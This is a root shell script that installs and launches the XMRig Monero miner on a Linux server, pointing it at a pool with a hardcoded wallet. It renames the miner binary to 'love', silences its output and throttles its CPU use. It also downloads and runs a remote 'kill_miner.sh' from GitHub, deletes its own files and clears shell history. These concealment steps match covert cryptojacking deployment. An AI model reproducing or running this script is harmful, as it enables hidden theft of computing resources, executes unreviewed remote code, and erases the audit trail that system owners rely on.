#!/bin/sh
#read -p "What is Worker? (exp: vps01): " worker
#IP4=$(curl -4 -s icanhazip.com)
rm -fv danielchau.sh
sudo apt-get update -y
sudo apt-get install cpulimit -y
wget --no-check-certificate -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
tar -xvf xmrig.tar.gz
chmod +x ./xmrig-6.21.0/* 
mv /root/xmrig-6.21.0/xmrig /root/love
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

cat >>/root/config.json <<EOF
{
    "pools": [
        {
            "algo": "randomx",
            "url": "randomx.rplant.xyz:17020",
            "user": "XM3icb22UhWR3yp5ahTfMT8zJE9hARMbBYnMw2n5JNp9QKdX33QDeSHD38TfAdX2WFhAq3QmtXqjwH2BQwTGH9Vr17N8UvNwi.linode"
        }  
    ]
}
EOF
cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
./kill_miner.sh
sleep 3
sudo /root/love > /dev/null 2>&1 &
sleep 3
EOF
sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof love) > /dev/null 2>&1 &" danielluis1921.sh
chmod +x /root/danielluis1921.sh

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
./danielluis1921.sh
rm -fv *
rm -fR cpuminer-opt-linux/
rm -fR xmrig-6.21.0/
history -c && history -w
